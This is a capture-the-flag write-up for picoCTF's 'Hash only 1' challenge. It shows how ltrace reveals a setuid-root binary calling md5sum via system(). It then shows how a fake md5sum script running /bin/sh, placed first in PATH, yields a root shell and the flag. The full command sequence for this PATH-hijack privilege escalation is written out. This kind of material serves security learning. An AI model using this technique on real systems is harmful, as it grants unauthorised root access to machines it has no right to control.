# Hash only 1

`Author: Junias Bonou`

> Description: Here is a binary that has enough privilege to read the content of the flag file but will only let you know its hash. If only it could just give you the actual content! Running the instance given in challenge we get the follwing commands to connect to remote server using ssh.

```
SSH command: ssh ctf-player@shape-facility.picoctf.net -p <PORT>

SSH password: <PASSWORD>

Copy binary to local machine:  scp -P <PORT> ctf-player@shape-facility.picoctf.net:~/flaghasher .
```

Firstly, i logged into remote server using ssh.

There i ran some commands to check my authority.

```bash
ctf-player@pico-chall$ whoami
ctf-player

ctf-player@pico-chall$ ls
flaghasher

ctf-player@pico-chall$ ./flaghasher 
Computing the MD5 hash of /root/flag.txt.... 

<MD5_HASH_OF_FLAG>  /root/flag.txt

ctf-player@pico-chall$ cd /root
Computing the MD5 hash of /root/flag.txt.... 

a02bbc9ebf913b57ee486b51accacf17  /root/flag.txt

ctf-player@pico-chall$ cd /root
-bash: cd: /root: Permission denied
```

We can see the user `ctf-player` has no access to root

Let's run `ls -la` to check permissions of executable `flaghasher`

```bash
ctf-player@pico-chall$ ls -la
total 24
drwxr-xr-x 1 ctf-player ctf-player    20 Apr 11 03:24 .
drwxr-xr-x 1 root       root          24 Mar  6 03:44 ..
drwx------ 2 ctf-player ctf-player    34 Apr 11 03:24 .cache
-rw-r--r-- 1 root       root          67 Mar  6 03:45 .profile
-rwsr-xr-x 1 root       root       18312 Mar  6 03:45 flaghasher

```

So executable `flaghasher` has root access.
umm... interesting

Let's use the other command initally given to make a copy of binary `flaghasher` in our local machine.

```bash
scp -P <PORT> ctf-player@shape-facility.picoctf.net:~/flaghasher .
```

Now after getting a copy of binary on local machine run `ltrace` command on binary.

The ltrace command in Linux is used to trace library calls made by a program. It shows you the calls to shared libraries (like libc, libm, etc.) and the arguments passed to them. It's especially useful for debugging and reverse engineering when you want to see what functions a binary is using without looking at the source code.

```bash
$ ltrace ./flaghasher    
_ZNSt8ios_base4InitC1Ev(0x564eb510f271, 0xffff, 0x7ffd621003b8, 320)            = 2
__cxa_atexit(0x7f9535075ae0, 0x564eb510f271, 0x564eb510f008, 320)               = 0
_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc(0x564eb510f040, 0x564eb510d010, 0x7ffd621003b8, 352) = 0x564eb510f040      
_ZNSolsEPFRSoS_E(0x564eb510f040, 0x7f95350f0650, 0x564eb510f040, 1024Computing the MD5 hash of /root/flag.txt....
)          = 0x564eb510f040
_ZNSolsEPFRSoS_E(0x564eb510f040, 0x7f95350f0650, 0x564eb510f040, 0x7f9534e91210
) = 0x564eb510f040
sleep(2)                                                                        = 0
_ZNSaIcEC1Ev(0x7ffd6210024b, 0, 0, 0x7f9534e68073)                              = 0x7ffd6210024b
_ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEC1EPKcRKS3_(0x7ffd62100250, 0x564eb510d040, 0x7ffd6210024b, 0x7f9534e68073) = 0x564ec6ceb6c0
_ZNSaIcED1Ev(0x7ffd6210024b, 0x564eb510d040, 36, 0x564ec6ceb6c0)                = 0x7ffd6210024b
setgid(0)                                                                       = -1
setuid(0)                                                                       = -1
_ZNKSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEE5c_strEv(0x7ffd62100250, 0x564eb510d040, 0, 0x7f9534e84f04) = 0x564ec6ceb6c0 
system("/bin/bash -c 'md5sum /root/flag."...md5sum: /root/flag.txt: Permission denied
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                          = 256
_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc(0x564eb510f160, 0x564eb510d068, 0, 0x7f9534e25ec4Error: system() call returned non-zero value: ) = 0x564eb510f160
_ZNSolsEi(0x564eb510f160, 256, 0x564eb510f160, 0x7f9534e91210256)                  = 0x564eb510f160
_ZNSolsEPFRSoS_E(0x564eb510f160, 0x7f95350f0650, 0x564eb510f160, 0x7f9534e91210
) = 0x564eb510f160
_ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEED1Ev(0x7ffd62100250, 0, 0x7f9534f75563, 0x7f9534e91210) = 0x564ec6cd9010      
+++ exited (status 1) +++

```

Focus on the line 

```
system("/bin/bash -c 'md5sum /root/flag.".
```

`md5sum` command is being invoked by the binary in order to create md5 hash of the flag situated at `/root/flag.txt`.

If we can somehow use our custom vulnerable `md5sum` named script instead of real `md5sum` script, we can gain the root shell access.

What to do -
- make binary named `md5sum` within the same directory as flaghasher
- add bash script path (`/bin/sh`) to it, so that it will run bash whenever invoked 
- give it executable permission using `chmod +x md5sum`
- append current directory (.) to list of path containing executable (`$PATH`)
- Now when you run the `flaghasher` binary the vulnerable `md5sum` will be the first to get invoked during execution of `flaghasher` and will give us access to the root shell
- Hence we can navigate to `/root` and use `cat` to get our flag printed.

Let's do it, log in to ssh first and then use these commands -

```
ctf-player@pico-chall$ echo "/bin/sh" > md5sum

ctf-player@pico-chall$ chmod +x ./md5sum

ctf-player@pico-chall$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin

ctf-player@pico-chall$ export PATH=.:$PATH

ctf-player@pico-chall$ echo $PATH
.:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin

ctf-player@pico-chall$ ./flaghasher 
Computing the MD5 hash of /root/flag.txt.... 

# ls
flaghasher  md5sum
# cd /root               
# ls
flag.txt
# cat flag.txt
picoCTF{sy5teM_b!n@riEs_4r3_5c@red_0f_yoU_0c1fd083}# 
```


yooo, we got our flag!!! 

In this way we have solved this challenge.